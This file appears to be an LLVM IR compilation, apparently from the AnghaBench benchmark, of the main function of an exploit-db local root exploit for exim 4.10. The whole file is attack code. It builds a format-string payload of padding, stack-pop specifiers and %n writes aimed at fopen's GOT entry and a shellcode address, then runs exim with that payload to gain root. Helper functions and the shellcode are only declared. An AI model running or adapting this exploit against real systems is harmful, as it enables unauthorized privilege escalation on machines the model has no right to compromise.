; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22066.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22066.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@FOPEN_GOT_ADDRESS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [69 x i8] c"local root exploit for exim 4.10 [only works for exim admin users]\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"./hoagie_exim path_to_exim\0A\0A\00", align 1
@path = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [36 x i8] c"Using %d bigpops and %d smallpops.\0A\00", align 1
@.str.3 = private unnamed_addr constant [19 x i8] c"Written bytes: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"/tmp/%s\00", align 1
@PADDING = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [2 x i8] c"Z\00", align 1
@.str.6 = private unnamed_addr constant [49 x i8] c"0000%c%c%c%c0000%c%c%c%c0000%c%c%c%c0000%c%c%c%c\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"%+e\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"%08x\00", align 1
@SHELLCODE_ADDRESS = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [37 x i8] c"%%.%uu%%n%%.%uu%%n%%.%uu%%n%%.%uu%%n\00", align 1
@.str.10 = private unnamed_addr constant [27 x i8] c"calling exim with fs='%s'\0A\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@port = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [5 x i8] c"exim\00", align 1
@.str.13 = private unnamed_addr constant [4 x i8] c"-bd\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.15 = private unnamed_addr constant [4 x i8] c"-oX\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"-oP\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"-F\00", align 1
@shellcode = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [10000 x i8], align 16
  %11 = alloca [1000 x i8], align 16
  %12 = alloca i64, align 8
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* @FOPEN_GOT_ADDRESS, align 4
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %12, align 8
  %22 = load i32, i32* @FOPEN_GOT_ADDRESS, align 4
  %23 = add nsw i32 %22, 1
  %24 = sext i32 %23 to i64
  store i64 %24, i64* %13, align 8
  %25 = load i32, i32* @FOPEN_GOT_ADDRESS, align 4
  %26 = add nsw i32 %25, 2
  %27 = sext i32 %26 to i64
  store i64 %27, i64* %14, align 8
  %28 = load i32, i32* @FOPEN_GOT_ADDRESS, align 4
  %29 = add nsw i32 %28, 3
  %30 = sext i32 %29 to i64
  store i64 %30, i64* %15, align 8
  %31 = load i32, i32* %4, align 4
  %32 = icmp ne i32 %31, 2
  br i1 %32, label %33, label %37

33:                                               ; preds = %2
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str, i64 0, i64 0))
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %36 = call i32 @exit(i32 1) #3
  unreachable

37:                                               ; preds = %2
  %38 = load i8*, i8** @path, align 8
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcpy(i8* %38, i8* %41)
  %43 = call i32 @getstackpops(i32* %6, i32* %7, i32* %8)
  %44 = load i32, i32* %6, align 4
  %45 = load i32, i32* %7, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i32 %44, i32 %45)
  %47 = load i32, i32* %8, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0), i32 %47)
  %49 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %50 = call i32 @strcpy(i8* %49, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %9, align 4
  br label %51

51:                                               ; preds = %58, %37
  %52 = load i32, i32* %9, align 4
  %53 = load i32, i32* @PADDING, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %61

55:                                               ; preds = %51
  %56 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %57 = call i32 (i8*, ...) @strcat(i8* %56, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0))
  br label %58

58:                                               ; preds = %55
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  br label %51

61:                                               ; preds = %51
  %62 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %63 = load i64, i64* %12, align 8
  %64 = call i32 @SB1(i64 %63)
  %65 = load i64, i64* %12, align 8
  %66 = call i32 @SB2(i64 %65)
  %67 = load i64, i64* %12, align 8
  %68 = call i32 @SB3(i64 %67)
  %69 = load i64, i64* %12, align 8
  %70 = call i32 @SB4(i64 %69)
  %71 = load i64, i64* %13, align 8
  %72 = call i32 @SB1(i64 %71)
  %73 = load i64, i64* %13, align 8
  %74 = call i32 @SB2(i64 %73)
  %75 = load i64, i64* %13, align 8
  %76 = call i32 @SB3(i64 %75)
  %77 = load i64, i64* %13, align 8
  %78 = call i32 @SB4(i64 %77)
  %79 = load i64, i64* %14, align 8
  %80 = call i32 @SB1(i64 %79)
  %81 = load i64, i64* %14, align 8
  %82 = call i32 @SB2(i64 %81)
  %83 = load i64, i64* %14, align 8
  %84 = call i32 @SB3(i64 %83)
  %85 = load i64, i64* %14, align 8
  %86 = call i32 @SB4(i64 %85)
  %87 = load i64, i64* %15, align 8
  %88 = call i32 @SB1(i64 %87)
  %89 = load i64, i64* %15, align 8
  %90 = call i32 @SB2(i64 %89)
  %91 = load i64, i64* %15, align 8
  %92 = call i32 @SB3(i64 %91)
  %93 = load i64, i64* %15, align 8
  %94 = call i32 @SB4(i64 %93)
  %95 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %62, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.6, i64 0, i64 0), i32 %64, i32 %66, i32 %68, i32 %70, i32 %72, i32 %74, i32 %76, i32 %78, i32 %80, i32 %82, i32 %84, i32 %86, i32 %88, i32 %90, i32 %92, i32 %94)
  %96 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %97 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %98 = call i32 (i8*, ...) @strcat(i8* %96, i8* %97)
  store i32 0, i32* %9, align 4
  br label %99

99:                                               ; preds = %106, %61
  %100 = load i32, i32* %9, align 4
  %101 = load i32, i32* %6, align 4
  %102 = icmp slt i32 %100, %101
  br i1 %102, label %103, label %109

103:                                              ; preds = %99
  %104 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %105 = call i32 (i8*, ...) @strcat(i8* %104, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  br label %106

106:                                              ; preds = %103
  %107 = load i32, i32* %9, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %9, align 4
  br label %99

109:                                              ; preds = %99
  store i32 0, i32* %9, align 4
  br label %110

110:                                              ; preds = %117, %109
  %111 = load i32, i32* %9, align 4
  %112 = load i32, i32* %7, align 4
  %113 = icmp slt i32 %111, %112
  br i1 %113, label %114, label %120

114:                                              ; preds = %110
  %115 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %116 = call i32 (i8*, ...) @strcat(i8* %115, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  br label %117

117:                                              ; preds = %114
  %118 = load i32, i32* %9, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %9, align 4
  br label %110

120:                                              ; preds = %110
  %121 = load i32, i32* @SHELLCODE_ADDRESS, align 4
  %122 = load i32, i32* %8, align 4
  %123 = call i32 @get_write_paddings(i32 %121, i32* %16, i32* %17, i32* %18, i32* %19, i32 %122)
  %124 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %125 = load i32, i32* %16, align 4
  %126 = load i32, i32* %17, align 4
  %127 = load i32, i32* %18, align 4
  %128 = load i32, i32* %19, align 4
  %129 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %124, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0), i32 %125, i32 %126, i32 %127, i32 %128)
  %130 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %131 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %132 = call i32 (i8*, ...) @strcat(i8* %130, i8* %131)
  %133 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %134 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.10, i64 0, i64 0), i8* %133)
  %135 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %136 = load i32, i32* @port, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* @port, align 4
  %138 = call i32 (i8*, i8*, i32, ...) @sprintf(i8* %135, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i32 %137)
  %139 = load i8*, i8** @path, align 8
  %140 = getelementptr inbounds [1000 x i8], [1000 x i8]* %11, i64 0, i64 0
  %141 = getelementptr inbounds [10000 x i8], [10000 x i8]* %10, i64 0, i64 0
  %142 = load i32, i32* @shellcode, align 4
  %143 = call i32 @execl(i8* %139, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.15, i64 0, i64 0), i8* %140, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i8* %141, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i32 %142, i32* null)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @getstackpops(i32*, i32*, i32*) #1

declare dso_local i32 @strcat(i8*, ...) #1

declare dso_local i32 @sprintf(i8*, i8*, i32, ...) #1

declare dso_local i32 @SB1(i64) #1

declare dso_local i32 @SB2(i64) #1

declare dso_local i32 @SB3(i64) #1

declare dso_local i32 @SB4(i64) #1

declare dso_local i32 @get_write_paddings(i32, i32*, i32*, i32*, i32*, i32) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
